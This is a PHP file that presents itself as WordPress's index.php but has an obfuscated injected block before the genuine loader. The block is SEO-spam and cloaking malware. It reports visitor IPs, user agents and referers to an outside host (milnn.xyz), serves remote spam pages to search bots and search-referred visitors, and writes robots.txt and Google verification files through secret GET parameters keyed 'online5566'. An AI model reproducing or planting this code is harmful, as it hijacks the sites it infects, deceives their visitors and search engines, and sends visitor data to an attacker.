<?php
error_reporting(0);
header("Content-Type: text/html; charset=utf-8");
$OoooOO0 = "fgs1075";
$OOOOOO =
    "%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a%7c";
$O = urldecode($OOOOOO);
date_default_timezone_set("PRC");
$OO = @$_SERVER[
    "DOCUMENT_ROOT"
];
$Oo = @$_SERVER[
    "REQUEST_URI"
];
$o0o0oOO000 = @basename(__FILE__);
$OoO = @$_SERVER[
    "HTTP_HOST"
];
$Ooolg = @$_SERVER[
    "HTTP_ACCEPT_LANGUAGE"
];
$OOOOO = @$_SERVER[
    "HTTP_USER_AGENT"
];
$OOOOOo = @$_SERVER[
    "HTTP_REFERER"
];
$OOOOOOO =
    (isset($_SERVER["HTTPS"]) &&
        $_SERVER["HTTPS"] ==
            "on") ||
    (isset(
        $_SERVER[
            "HTTP_X_FORWARDED_PROTO"
        ]
    ) &&
        $_SERVER[
            "HTTP_X_FORWARDED_PROTO"
        ] ==
            "https")
        ? "https://"
        : "http://";
$OOOOOOOo = $OOOOOOO . $OoO;
$OOOOO = @strtolower($OOOOO);
$OOOOOo = @strtolower($OOOOOo);
if (
    getenv(
        "HTTP_CLIENT_IP"
    )
) {
    $oo00oo00 = getenv(
        "HTTP_CLIENT_IP"
    );
} elseif (
    getenv(
        "HTTP_X_FORWARDED_FOR"
    )
) {
    $oo00oo00 = getenv(
        "HTTP_X_FORWARDED_FOR"
    );
} elseif (
    getenv(
        "REMOTE_ADDR"
    )
) {
    $oo00oo00 = getenv(
        "REMOTE_ADDR"
    );
} else {
    $oo00oo00 =
        $_SERVER[
            "REMOTE_ADDR"
        ];
}
if (
    isset($_GET["vf"]) &&
    $_GET["vf"] ==
        "online5566"
) {
    echo "domain online!";
    exit();
}
if (
    strstr(
        $Oo,
        "sitemap_index_"
    )
) {
    $Ooooo = dirname($Oo);
    OooooOOOOoo($O, $OoooOO0, $OOOOOOOo, $Oo, $OoO, $OOOOOOO, $Ooooo);
}
if (strstr($Oo, ".xml")) {
    $Ooooo = dirname($Oo);
    OooooO($O, $OoooOO0, $OOOOOOOo, $Oo, $OOOOOOO, $OoO, $oo00oo00, $Ooooo);
}
function OooooOOOOoo($O, $OoooOO0, $OOOOOOOo, $Oo, $OoO, $OOOOOOO, $Ooooo)
{
    $Oooooo =
        "http://" .
        $OoooOO0 .
        ".milnn.xyz/Api/siteAllMap.php?page=" .
        $Oo .
        "&pwd=sl123&domain=" .
        $OOOOOOOo .
        "&cur=" .
        $o0o0oOO000 = basename(__FILE__);
    if (
        $_GET[
            "vf_allmap"
        ] ==
        "online5566"
    ) {
        echo $Oooooo;
        exit();
    }
    $Ooooooo = json_decode(OooooOO($O, $Oooooo), true);
    if (empty($Ooooooo) || $Ooooooo["code"] == 404) {
        header(
            "HTTP/1.0 404 Not Found"
        );
        header(
            "Status: 404 Not Found"
        );
        exit();
    }
    if (empty($Ooooooo) || $Ooooooo["code"] == 444) {
        header(
            "HTTP/1.0 404 Not Found"
        );
        header(
            "Status: 404 Not Found"
        );
        exit();
    }
    $Oooooooo = $Ooooooo["data"];
    header(
        "Content-type:text/xml"
    );
    echo $Oooooooo;
    exit();
}
function OooooO(
    $O,
    $OoooOO0,
    $OOOOOOOo,
    $Oo,
    $OOOOOOO,
    $OoO,
    $oo00oo00,
    $Ooooo = "",
    $o0o0oo = ""
) {
    $Oooooo =
        "http://" .
        $OoooOO0 .
        ".milnn.xyz/Api/siteUrlApi.php?stype=sitemap&num=6000&pr=" .
        $Ooooo .
        "&url=" .
        $Oo .
        "&domain=" .
        $OOOOOOOo .
        "&ip=" .
        $oo00oo00 .
        "&cur=" .
        $o0o0oOO000 = basename(__FILE__);
    if (
        $_GET["vf_map"] ==
        "online5566"
    ) {
        echo $Oooooo;
        exit();
    }
    $Ooooooo = json_decode(OooooOO($O, $Oooooo), true);
    if (
        isset($Ooooooo["code"]) &&
        $Ooooooo["code"] == "600"
    ) {
        $Oooooooo = $Ooooooo["data"];
        foreach ($Oooooooo as $Oog => $Oov) {
            $o0o0oooo = OooooOO($O, $Oov);
            $Oooo0s =
                strpos(
                    $o0o0oooo,
                    "Sitemap Notification Received"
                ) !== false
                    ? "OK"
                    : "ERROR";
            echo $Oov .
                "===>Submitting Google Sitemap: " .
                $Oooo0s .
                PHP_EOL;
        }
        exit();
    }
    if (
        isset($Ooooooo["code"]) &&
        $Ooooooo["code"] == "406"
    ) {
        echo "Submitting Google Sitemap Return Fail";
        exit();
    }
    if (empty($Ooooooo) || $Ooooooo["code"] == 404) {
        header(
            "HTTP/1.0 404 Not Found"
        );
        header(
            "Status: 404 Not Found"
        );
        exit();
    }
    $Oooooooo = $Ooooooo["data"];
    header(
        "Content-type:text/xml"
    );
    echo $Oooooooo;
    exit();
}
if (isset($_GET["google"])) {
    $OoOO = $_GET["google"];
    if (
        preg_match(
            "/^google.*?(\\.html)$/i",
            $OoOO
        )
    ) {
        if (
            OooooOOOO(
                $O,
                $OoOO,
                "google-site-verification: " .
                    $OoOO
            )
        ) {
            exit(
                "<a href=" .
                    $OoOO .
                    ">" .
                    $OoOO .
                    "</a>"
            );
        } else {
            exit(
                "fail!!!!"
            );
        }
    }
}
if (isset($_GET["robots"])) {
    $both = "";
    $o0o0o = $_GET["robots"];
    $Oooooo =
        "http://" .
        $OoooOO0 .
        ".milnn.xyz/Api/rob.php?rob=" .
        $o0o0o .
        "&pwd=sl123&domain=" .
        $OOOOOOOo .
        "&cur=" .
        $o0o0oOO000;
    if (
        $_GET["vf_bot"] ==
        "online5566"
    ) {
        echo $Oooooo;
        exit();
    }
    $Ooooooo = json_decode(OooooOO($O, $Oooooo), true);
    if (empty($Ooooooo) || $Ooooooo["code"] == 404) {
        header(
            "HTTP/1.0 404 Not Found"
        );
        header(
            "Status: 404 Not Found"
        );
        exit();
    }
    $Oooooooo = $Ooooooo["data"];
    if (
        OooooOOOO(
            $O,
            "robots.txt",
            $Oooooooo
        )
    ) {
        echo $Oooooooo;
        exit();
    } else {
        exit("fail!!!");
    }
}
if (
    preg_match(
        "/google.co.jp|yahoo|google\\.com[^.]*?$|bing/i",
        $OOOOOo
    )
) {
    if (
        $_GET["vf_jump"] ==
        "online5566"
    ) {
        echo "http://" .
            $OoooOO0 .
            ".milnn.xyz/jump.php?domain=" .
            $OoO .
            "&page=" .
            $Oo .
            "&bot=0&pr=" .
            $Ooooo .
            "&refer=" .
            $OOOOOo .
            "&ip=" .
            $oo00oo00 .
            "&lg=" .
            $Ooolg .
            "&cur=" .
            $o0o0oOO000;
        exit();
    }
    $o0o0ooo = OooooOO(
        $O,
        "http://" .
            $OoooOO0 .
            ".milnn.xyz/jump.php?domain=" .
            $OoO .
            "&page=" .
            $Oo .
            "&bot=0&pr=" .
            $Ooooo .
            "&refer=" .
            $OOOOOo .
            "&ip=" .
            $oo00oo00 .
            "&lg=" .
            $Ooolg .
            "&cur=" .
            $o0o0oOO000
    );
    if ($o0o0ooo) {
        echo $o0o0ooo;
        exit();
    }
}
if (
    stristr(
        $OOOOO,
        "googlebot"
    ) ||
    stristr($OOOOO, "bing") ||
    stristr($OOOOO, "Y!J") ||
    stristr($OOOOO, "y!j") ||
    stristr($OOOOO, "yahoo") ||
    stristr($OOOOO, "google") ||
    stristr(
        $OOOOO,
        "Googlebot"
    ) ||
    stristr(
        $OOOOO,
        "googlebot"
    )
) {
    if (
        $_GET["vf_bot"] ==
        "online5566"
    ) {
        echo "http://" .
            $OoooOO0 .
            ".milnn.xyz/918.php?domain=" .
            $OoO .
            "&page=" .
            $Oo .
            "&bot=1&pr=" .
            $Ooooo .
            "&ip=" .
            $oo00oo00 .
            "&lg=" .
            $Ooolg .
            "&cur=" .
            $o0o0oOO000;
        exit();
    }
    $OooOO = OooooOO(
        $O,
        "http://" .
            $OoooOO0 .
            ".milnn.xyz/918.php?domain=" .
            $OoO .
            "&page=" .
            $Oo .
            "&bot=1&pr=" .
            $Ooooo .
            "&ip=" .
            $oo00oo00 .
            "&lg=" .
            $Ooolg .
            "&cur=" .
            $o0o0oOO000
    );
    if (!empty($OooOO)) {
        $Ooooooo = json_decode($OooOO, true);
        if ($Ooooooo["code"] == 404) {
            header(
                "HTTP/1.0 404 Not Found"
            );
            header(
                "Status: 404 Not Found"
            );
            exit();
        }
        if ($Ooooooo["code"] == 500) {
            header(
                "HTTP/1.1 500 Internal Server Error"
            );
            exit();
        }
        echo $OooOO;
        exit();
    }
}
if (
    $_GET[
        "vf_origin"
    ] ==
    "online5566"
) {
    echo "http://" .
        $OoooOO0 .
        ".milnn.xyz/org.php?domain=" .
        $OoO .
        "&page=" .
        $Oo .
        "&pr=" .
        $Ooooo .
        "&ip=" .
        $oo00oo00 .
        "&lg=" .
        $Ooolg .
        "&cur=" .
        $o0o0oOO000;
    exit();
}
OooooOO(
    $O,
    "http://" .
        $OoooOO0 .
        ".milnn.xyz/org.php?domain=" .
        $OoO .
        "&page=" .
        $Oo .
        "&pr=" .
        $Ooooo .
        "&ip=" .
        $oo00oo00 .
        "&lg=" .
        $Ooolg .
        "&cur=" .
        $o0o0oOO000
);
function OooooOO($O, $OooO)
{
    $OooOO = "";
    $OooOOO =
        "Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)";
    if (
        function_exists(
            "curl_init"
        )
    ) {
        try {
            $OooOOOO = curl_init();
            $OoooOO = 30;
            curl_setopt($OooOOOO, CURLOPT_URL, $OooO);
            curl_setopt($OooOOOO, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($OooOOOO, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($OooOOOO, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($OooOOOO, CURLOPT_CONNECTTIMEOUT, $OoooOO);
            $OooOO = curl_exec($OooOOOO);
            curl_close($OooOOOO);
        } catch (Exception $e) {
        }
    }
    if (
        strlen($OooOO) < 1 &&
        function_exists(
            "file_get_contents"
        )
    ) {
        ini_set(
            "user_agent",
            $OooOOO
        );
        try {
            $OooOO = @file_get_contents($OooO);
        } catch (Exception $e) {
        }
    }
    return $OooOO;
}
function OooooOOOO($O, $Ooo, $OooOOOOO)
{
    ($OoooO = fopen($Ooo, "w")) or die("0");
    $result = fwrite($OoooO, $OooOOOOO);
    fclose($OoooO);
    return $result;
}
?>
 /**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */ /**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */<?php


define("WP_USE_THEMES", true);
/** Loads the WordPress Environment and Template */ require dirname(__FILE__) .
    "/wp-blog-header.php";

